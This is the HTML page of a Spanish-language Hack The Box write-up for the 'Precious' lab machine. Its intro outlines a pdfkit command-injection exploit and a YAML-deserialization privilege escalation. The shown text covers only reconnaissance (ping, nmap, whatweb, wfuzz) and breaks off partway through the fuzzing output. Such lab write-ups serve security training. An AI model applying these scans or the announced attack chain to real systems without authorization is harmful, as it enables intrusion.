@@ -1,0 +1,1455 @@
+<!DOCTYPE html>
+<html lang="es-MX">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Precious - Hack The Box · BerserkWings - Hacking Ético</title>
+<meta name="description" content="Writeups de ciberseguridad, CTFs, Active Directory y certificaciones.">
+
+<meta http-equiv="Content-Security-Policy"
+      content="default-src 'self';
+               img-src 'self';
+               style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
+               font-src 'self' https://fonts.gstatic.com;
+               script-src 'self' ;
+               connect-src 'self' ;
+               object-src 'none';
+               base-uri 'self';
+               form-action 'self';
+               upgrade-insecure-requests;">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+
+<link rel="canonical" href="http://localhost:1313/htb-writeup-precious/">
+<link rel="icon" href="/assets/images/favicon.png">
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@500;600;700&family=Inter:wght@400;500&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/main.min.b51fce260bd224cda026ea0223adf133e0ce779edbb6c14d513c3f101c33a9ff.css" integrity="sha256-tR/OJgvSJM2gJuoCI63xM&#43;DOd57btsFNUTw/EBwzqf8=">
+
+
+<meta property="og:title" content="Precious - Hack The Box">
+<meta property="og:description" content="Writeups de ciberseguridad, CTFs, Active Directory y certificaciones.">
+<meta property="og:type" content="article">
+<meta property="og:image" content="http://localhost:1313/assets/images/htb-writeup-precious/precious_logo.png">
+
+
+
+</head>
+<body>
+  <header class="site-header">
+  <div class="wrap">
+    <a class="brand" href="/">
+      
+      <img class="brand-logo" src="http://localhost:1313/assets/images/masthead.png" alt="BerserkWings">
+      
+    </a>
+    <nav class="main-nav">
+      
+        <a href="/" >Inicio</a>
+      
+        <a href="/posts/" >Writeups</a>
+      
+        <a href="/categories/" >Categorías</a>
+      
+        <a href="/tags/" >Etiquetas</a>
+      
+        <a href="/buscador/" >Buscador</a>
+      
+        <a href="/acerca-de-mi/" >Acerca de mí</a>
+      
+    </nav>
+  </div>
+</header>
+
+  <main>
+    
+<canvas class="hero-matrix-bg hero-matrix-bg--dim" id="heroMatrixBg" aria-hidden="true"></canvas>
+<article class="post" id="top">
+  
+
+
+
+
+<aside class="side-profile">
+  <img class="side-avatar" src="http://localhost:1313/assets/images/avatar.png" alt="BerserkWings">
+  <div class="side-name">BerserkWings</div>
+  <div class="side-tagline">Aspirante a Pentester · CTF Player</div>
+
+  
+  <div class="side-platforms">
+    <span class="side-platform-badge">HTB: BerserkWings</span>
+    <span class="side-platform-badge">THL: BerserkWings</span>
+  </div>
+  
+
+  <div class="side-contact">
+    <span class="side-meta">📍 México</span>
+    
+    <a class="side-meta-link" href="https://github.com/BerserkWings" target="_blank" rel="noopener noreferrer">🔗 GitHub</a>
+    
+  </div>
+
+  
+  <div class="side-posts">
+    <div class="side-post-cards">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/htb-writeup-metatwo/">
+          <span class="side-post-card-title">MetaTwo</span>
+          <span class="side-post-card-platform">Hack The Box</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/htb-writeup-soccer/">
+          <span class="side-post-card-title">Soccer</span>
+          <span class="side-post-card-platform">Hack The Box</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <div class="side-post-card is-current">
+          <span class="side-post-card-title">Precious</span>
+          <span class="side-post-card-platform">Hack The Box</span>
+        </div>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/WiFi-Notes1/">
+          <span class="side-post-card-title">Hacking WiFi</span>
+          <span class="side-post-card-platform">Modo Monitor y Falsificación de MAC de una Tarjeta de Red</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/htb-writeup-sense/">
+          <span class="side-post-card-title">Sense</span>
+          <span class="side-post-card-platform">Hack The Box</span>
+        </a>
+        
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+  </div>
+  
+
+  
+
+  
+
+
+</aside>
+
+
+  
+  
+  
+
+  <header class="post-header">
+    
+    <div class="post-meta">HackTheBox / Easy Machine</div>
+    
+    <h1>Precious - Hack The Box</h1>
+    <div class="post-meta">10 April 2023 · 18 min de lectura</div>
+  </header>
+
+  
+  <img class="post-cover" src="http://localhost:1313/assets/images/htb-writeup-precious/precious_logo.png" alt="Precious - Hack The Box">
+  
+
+  
+  <p class="post-lead">Esta fue una máquina algo difícil, porque no sabía bien como acceder como usuario, trate de cargar un Payload, pero no funciono, estudie el ataque Smuggling para tratar de obtener credenciales, pero no lo entendí del todo bien, intente usar un Exploit para Ruby-on-rails, pero no funciono, por eso tarde bastante en resolverla. En fin, vamos a abusar de la herramienta que genera el el PDF que usa la página web de la máquina, llamado pdfkit, usaremos el Exploit CVE-2022-25765 para acceder a la máquina y robar las credenciales del usuario. Una vez conectados como usuario, abusaremos de un script de Ruby que tiene permisos de SUDO para inyectar código malicioso que nos permita escalar privilegios como root, esto en base al YAML Deserialization.</p>
+  
+
+  
+  <details class="post-tools">
+    <summary>🛠 Herramientas utilizadas</summary>
+
+    
+      
+      <ul><li><code>ping</code></li><li><code>nmap</code></li><li><code>wappalizer</code></li><li><code>whatweb</code></li><li><code>wfuzz</code></li><li><code>python3</code></li><li><code>nc</code></li><li><code>pdfinfo</code></li><li><code>python</code></li><li><code>exiftool</code></li><li><code>wget</code></li><li><code>curl</code></li><li><code>ssh</code></li><li><code>sudo</code></li><li><code>bash</code></li></ul>
+    
+  </details>
+  
+
+  
+  <details class="toc" id="indice" open>
+    <summary>📑 Índice</summary>
+    <nav>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#Recopilacion">Recopilación de Información</a>
+      <ul>
+        <li><a href="#Ping">Traza ICMP</a></li>
+        <li><a href="#Puertos">Escaneo de Puertos</a></li>
+        <li><a href="#Servicios">Escaneo de Servicios</a></li>
+      </ul>
+    </li>
+    <li><a href="#Analisis">Análisis de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#HTTP">Analizando Servicio HTTP</a></li>
+        <li><a href="#Fuzz">Fuzzing</a></li>
+        <li><a href="#HTTP2">Probando el Convertor PDF de la Página Web</a>
+          <ul>
+            <li><a href="#HTTP3">Obteniendo Información y Metadatos de PDF con pdfinfo y exiftool</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#Explotacion">Explotación de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#pdfkit">Aplicando Inyección de Comandos</a></li>
+        <li><a href="#pdfkit2">Buscando un Exploit para pdfkit v0.8.6</a>
+          <ul>
+            <li><a href="#pdfkit3">Probando Exploit: CVE-2022–25765 (pdfkit) - Command Injection</a></li>
+            <li><a href="#pdfkit4">Probando Exploit: PDFkit-CMD-Injection</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#Post">Post Explotación</a>
+      <ul>
+        <li><a href="#Ruby">Enumeración de Usuario Ruby</a></li>
+        <li><a href="#post">Enumeración de Usuario Henry</a></li>
+        <li><a href="#yaml">Aplicando YAML Deserialization Attack</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+      <ul><li><a href="#links-de-investigacion">Links de investigación</a></li></ul>
+    </nav>
+  </details>
+  <aside class="side-toc">
+    <div class="side-toc-header">📑 Índice</div>
+    <nav>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#Recopilacion">Recopilación de Información</a>
+      <ul>
+        <li><a href="#Ping">Traza ICMP</a></li>
+        <li><a href="#Puertos">Escaneo de Puertos</a></li>
+        <li><a href="#Servicios">Escaneo de Servicios</a></li>
+      </ul>
+    </li>
+    <li><a href="#Analisis">Análisis de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#HTTP">Analizando Servicio HTTP</a></li>
+        <li><a href="#Fuzz">Fuzzing</a></li>
+        <li><a href="#HTTP2">Probando el Convertor PDF de la Página Web</a>
+          <ul>
+            <li><a href="#HTTP3">Obteniendo Información y Metadatos de PDF con pdfinfo y exiftool</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#Explotacion">Explotación de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#pdfkit">Aplicando Inyección de Comandos</a></li>
+        <li><a href="#pdfkit2">Buscando un Exploit para pdfkit v0.8.6</a>
+          <ul>
+            <li><a href="#pdfkit3">Probando Exploit: CVE-2022–25765 (pdfkit) - Command Injection</a></li>
+            <li><a href="#pdfkit4">Probando Exploit: PDFkit-CMD-Injection</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#Post">Post Explotación</a>
+      <ul>
+        <li><a href="#Ruby">Enumeración de Usuario Ruby</a></li>
+        <li><a href="#post">Enumeración de Usuario Henry</a></li>
+        <li><a href="#yaml">Aplicando YAML Deserialization Attack</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+      <ul><li><a href="#links-de-investigacion">Links de investigación</a></li></ul>
+    </nav>
+  </aside>
+  
+
+  <div class="post-content">
+    <h2 id="Recopilacion">Recopilación de Información</h2>
+<h3 id="Ping">Traza ICMP</h3>
+<p>Vamos a realizar un ping para saber si la máquina está conectada y en base al TTL veremos que SO opera en la máquina.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ping -c <span style="color:#ae81ff">4</span> 10.10.11.189                        
+</span></span><span style="display:flex;"><span>PING 10.10.11.189 <span style="color:#f92672">(</span>10.10.11.189<span style="color:#f92672">)</span> 56<span style="color:#f92672">(</span>84<span style="color:#f92672">)</span> bytes of data.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 10.10.11.189: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">63</span> time<span style="color:#f92672">=</span><span style="color:#ae81ff">129</span> ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 10.10.11.189: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">63</span> time<span style="color:#f92672">=</span><span style="color:#ae81ff">130</span> ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 10.10.11.189: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">63</span> time<span style="color:#f92672">=</span><span style="color:#ae81ff">130</span> ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 10.10.11.189: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">4</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">63</span> time<span style="color:#f92672">=</span><span style="color:#ae81ff">130</span> ms
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>--- 10.10.11.189 ping statistics ---
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">4</span> packets transmitted, <span style="color:#ae81ff">4</span> received, 0% packet loss, time 3013ms
+</span></span><span style="display:flex;"><span>rtt min/avg/max/mdev <span style="color:#f92672">=</span> 129.359/129.769/129.969/0.241 ms
+</span></span></code></pre></div><p>Por el TTL sabemos que la máquina usa Linux, hagamos los escaneos de puertos y servicios.</p>
+<h3 id="Puertos">Escaneo de Puertos</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -sS --min-rate <span style="color:#ae81ff">5000</span> -vvv -n -Pn 10.10.11.189 -oG allPorts
+</span></span><span style="display:flex;"><span>Host discovery disabled <span style="color:#f92672">(</span>-Pn<span style="color:#f92672">)</span>. All addresses will be marked <span style="color:#e6db74">&#39;up&#39;</span> and scan times may be slower.
+</span></span><span style="display:flex;"><span>Starting Nmap 7.93 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2023-04-10 11:49 CST
+</span></span><span style="display:flex;"><span>Initiating SYN Stealth Scan at 11:49
+</span></span><span style="display:flex;"><span>Scanning 10.10.11.189 <span style="color:#f92672">[</span><span style="color:#ae81ff">65535</span> ports<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Discovered open port 22/tcp on 10.10.11.189
+</span></span><span style="display:flex;"><span>Discovered open port 80/tcp on 10.10.11.189
+</span></span><span style="display:flex;"><span>Completed SYN Stealth Scan at 11:49, 27.06s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">65535</span> total ports<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.189
+</span></span><span style="display:flex;"><span>Host is up, received user-set <span style="color:#f92672">(</span>0.89s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Scanned at 2023-04-10 11:49:23 CST <span style="color:#66d9ef">for</span> 27s
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">53229</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>, <span style="color:#ae81ff">12304</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE REASON
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     syn-ack ttl <span style="color:#ae81ff">63</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    syn-ack ttl <span style="color:#ae81ff">63</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Read data files from: /usr/bin/../share/nmap
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 27.30 seconds
+</span></span><span style="display:flex;"><span>           Raw packets sent: <span style="color:#ae81ff">126040</span> <span style="color:#f92672">(</span>5.546MB<span style="color:#f92672">)</span> | Rcvd: <span style="color:#ae81ff">12410</span> <span style="color:#f92672">(</span>496.440KB<span style="color:#f92672">)</span>
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-p-</em></td>
+					<td>Para indicarle un escaneo en ciertos puertos.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;open</em></td>
+					<td>Para indicar que aplique el escaneo en los puertos abiertos.</td>
+			</tr>
+			<tr>
+					<td><em>-sS</em></td>
+					<td>Para indicar un TCP Syn Port Scan para que nos agilice el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;min-rate</em></td>
+					<td>Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000).</td>
+			</tr>
+			<tr>
+					<td><em>-vvv</em></td>
+					<td>Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>-n</em></td>
+					<td>Para indicar que no se aplique resolución dns para agilizar el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>-Pn</em></td>
+					<td>Para indicar que se omita el descubrimiento de hosts.</td>
+			</tr>
+			<tr>
+					<td><em>-oG</em></td>
+					<td>Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Veo solamente dos puertos abiertos, como no tenemos credenciales para el SSH, vamos directamente con el puerto HTTP.</p>
+<h3 id="Servicios">Escaneo de Servicios</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sC -sV -p22,80 10.10.11.189 -oN targeted                           
+</span></span><span style="display:flex;"><span>Starting Nmap 7.93 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2023-04-10 11:51 CST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.189
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.13s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> 845e13a8e31e20661d235550f63047d2 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> a2ef7b9665ce4161c467ee4e96c7c892 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 33053dcd7ab798458239e7ae3c91a658 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    nginx 1.18.0
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://precious.htb/
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 13.19 seconds
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-sC</em></td>
+					<td>Para indicar un lanzamiento de scripts básicos de reconocimiento.</td>
+			</tr>
+			<tr>
+					<td><em>-sV</em></td>
+					<td>Para identificar los servicios/versión que están activos en los puertos que se analicen.</td>
+			</tr>
+			<tr>
+					<td><em>-p</em></td>
+					<td>Para indicar puertos específicos.</td>
+			</tr>
+			<tr>
+					<td><em>-oN</em></td>
+					<td>Para indicar que el output se guarde en un fichero. Lo llame targeted.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Bien, ahí nos dice que se esta ocupando un servicio, el <strong>nginx 1.18.0</strong>, y nos menciona que no puede redirigirse al dominio <strong>precious.htb</strong>. Esto ya nos da una idea de lo que esta pasando, así que es momento de analizar la página web.</p>
+<h2 id="Analisis">Análisis de Vulnerabilidades</h2>
+<h3 id="HTTP">Analizando Servicio HTTP</h3>
+<p>Entremos.</p>
+<p>Al parecer no se puede, ya sabemos qué hacer en estos casos, registremos el dominio en el <strong>/etc/hosts</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nano /etc/hosts
+</span></span><span style="display:flex;"><span>10.10.11.189 precious.htb
+</span></span></code></pre></div><p>Recargamos la página y ahora sí, ya podemos verla.</p>
+<p><img src="/assets/images/htb-writeup-precious/Captura1.png" alt=""></p>
+<p>Vale, por lo que nos dice, convierte una página web en un <strong>archivo PDF</strong>, veamos lo que nos dice el <strong>Wappalizer</strong>:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-precious/Captura2.png">
+</p>
+<p>Ahí vemos el servicio <strong>nginx 1.18.0</strong>, el servicio <strong>Phusion Passenger</strong> y vemos que la página está hecha en <strong>PHP</strong>, esto nos puede servir más adelante.</p>
+<p>Ahora, veamos que nos dice la <strong>herramienta whatweb</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>whatweb http://10.10.11.189
+</span></span><span style="display:flex;"><span>http://10.10.11.189 <span style="color:#f92672">[</span><span style="color:#ae81ff">302</span> Found<span style="color:#f92672">]</span> Country<span style="color:#f92672">[</span>RESERVED<span style="color:#f92672">][</span>ZZ<span style="color:#f92672">]</span>, HTTPServer<span style="color:#f92672">[</span>nginx/1.18.0<span style="color:#f92672">]</span>, IP<span style="color:#f92672">[</span>10.10.11.189<span style="color:#f92672">]</span>, RedirectLocation<span style="color:#f92672">[</span>http://precious.htb/<span style="color:#f92672">]</span>, Title<span style="color:#f92672">[</span><span style="color:#ae81ff">302</span> Found<span style="color:#f92672">]</span>, nginx<span style="color:#f92672">[</span>1.18.0<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>http://precious.htb/ <span style="color:#f92672">[</span><span style="color:#ae81ff">200</span> OK<span style="color:#f92672">]</span> Country<span style="color:#f92672">[</span>RESERVED<span style="color:#f92672">][</span>ZZ<span style="color:#f92672">]</span>, HTML5, HTTPServer<span style="color:#f92672">[</span>nginx/1.18.0 + Phusion Passenger<span style="color:#f92672">(</span>R<span style="color:#f92672">)</span> 6.0.15<span style="color:#f92672">]</span>, IP<span style="color:#f92672">[</span>10.10.11.189<span style="color:#f92672">]</span>, Ruby-on-Rails, Title<span style="color:#f92672">[</span>Convert Web Page to PDF<span style="color:#f92672">]</span>, UncommonHeaders<span style="color:#f92672">[</span>x-content-type-options<span style="color:#f92672">]</span>, X-Frame-Options<span style="color:#f92672">[</span>SAMEORIGIN<span style="color:#f92672">]</span>, X-Powered-By<span style="color:#f92672">[</span>Phusion Passenger<span style="color:#f92672">(</span>R<span style="color:#f92672">)</span> 6.0.15<span style="color:#f92672">]</span>, X-XSS-Protection<span style="color:#f92672">[</span>1; mode<span style="color:#f92672">=</span>block<span style="color:#f92672">]</span>, nginx<span style="color:#f92672">[</span>1.18.0<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>Bien, algo interesante que podemos ver, tanto en <strong>Wappalizer</strong> como con <strong>whatweb</strong>, es que utiliza los servidores web de <strong>nginx</strong> y otro llamado <strong>Phusion Passenger</strong>, vamos a investigarlos:</p>
+<table>
+	<thead>
+			<tr>
+					<th style="text-align: center"><strong>Servidor Web nginx</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: center"><em>Nginx ​ es un servidor web/Proxy inverso ligero de alto rendimiento y un proxy para protocolos de correo electrónico.​​ Es software libre y de código abierto, licenciado bajo la Licencia BSD simplificada; también existe una versión comercial distribuida bajo el nombre de Nginx Plus.​</em></td>
+			</tr>
+	</tbody>
+</table>
+<table>
+	<thead>
+			<tr>
+					<th style="text-align: center"><strong>Servidor Web Phusion Passenger</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: center"><em>Phusion Passenger es un servidor web gratuito y un servidor de aplicaciones compatible con Ruby, Python y Node.js. Está diseñado para integrarse en el servidor Apache HTTP o el servidor web nginx, pero también tiene un modo para ejecutarse de forma independiente sin un servidor web externo.</em></td>
+			</tr>
+	</tbody>
+</table>
+<p>OK, lo que me da a entender el ultimo servidor web, es que estan utilizando Ruby y Python para el funcionamiento de la página web. Esto nos lo confirma <strong>whatweb</strong>, pues nos muestra que estan ocupando Ruby-on-Rails, veamos de que se trata esto:</p>
+<table>
+	<thead>
+			<tr>
+					<th style="text-align: center"><strong>Ruby-on-Rails</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: center"><em>Ruby on Rails, también conocido como RoR o Rails, es un framework de aplicaciones web de código abierto del lado del servidor escrito en el lenguaje de programación Ruby, siguiendo el paradigma del patrón Modelo Vista Controlador.</em></td>
+			</tr>
+	</tbody>
+</table>
+<p>Excelente, ya tenemos bastante información que nos va a ser útil para después. Hagamos <strong>Fuzzing</strong> para ver si hay algo de interés.</p>
+<h3 id="Fuzz">Fuzzing</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wfuzz -c --hc<span style="color:#f92672">=</span><span style="color:#ae81ff">404</span> -t <span style="color:#ae81ff">200</span> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://precious.htb/FUZZ/      
+</span></span><span style="display:flex;"><span> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span style="color:#960050;background-color:#1e0010">&#39;</span>s documentation <span style="color:#66d9ef">for</span> more information.
+</span></span><span style="display:flex;"><span>********************************************************
+</span></span><span style="display:flex;"><span>* Wfuzz 3.1.0 - The Web Fuzzer                         *
+</span></span><span style="display:flex;"><span>********************************************************
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Target: http://precious.htb/FUZZ/
+</span></span><span style="display:flex;"><span>Total requests: 220560
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=====================================================================</span>
+</span></span><span style="display:flex;"><span>ID           Response   Lines    Word       Chars       Payload                                                              
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=====================================================================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>000000014:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">18</span> L     <span style="color:#ae81ff">42</span> W       <span style="color:#ae81ff">483</span> Ch      <span style="color:#e6db74">&#34;http://precious.htb//&#34;</span>                                              
+</span></span><span style="display:flex;"><span>000045240:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">18</span> L     <span style="color:#ae81ff">42</span> W       <span style="color:#ae81ff">483</span> Ch      <span style="color:#e6db74">&#34;http://precious.htb//&#34;</span>                                              
+</span></span><span style="display:flex;"><span>000155453:   <span style="color:#ae81ff">503</span>        <span style="color:#ae81ff">0</span> L      <span style="color:#ae81ff">29</span> W       <span style="color:#ae81ff">189</span> Ch      <span style="color:#e6db74">&#34;previousHeaderGraphics&#34;</span>                                             
+</span></span><span style="display:flex;"><span>000155446:   <span style="color:#ae81ff">503</span>        <span style="color:#ae81ff">0</span> L      <span style="color:#ae81ff">29</span> W       <span style="color:#ae81ff">189</span> Ch      <span style="color:#e6db74">&#34;newsforgeNewsforge&#34;</span>                                                 
+</span></span><span style="display:flex;"><span>000155438:   <span style="color:#ae81ff">503</span>        <span style="color:#ae81ff">0</span> L      <span style="color:#ae81ff">29</span> W       <span style="color:#ae81ff">189</span> Ch      <span style="color:#e6db74">&#34;ps-vir5&#34;</span>                                                            
+</span></span><span style="display:flex;"><span>000155429:   <span style="color:#ae81ff">503</span>        <span style="color:#ae81ff">0</span> L      <span style="color:#ae81ff">29</span> W       <span style="color:#ae81ff">189</span> Ch      <span style="color:#e6db74">&#34;ble&#34;</span>                                                                
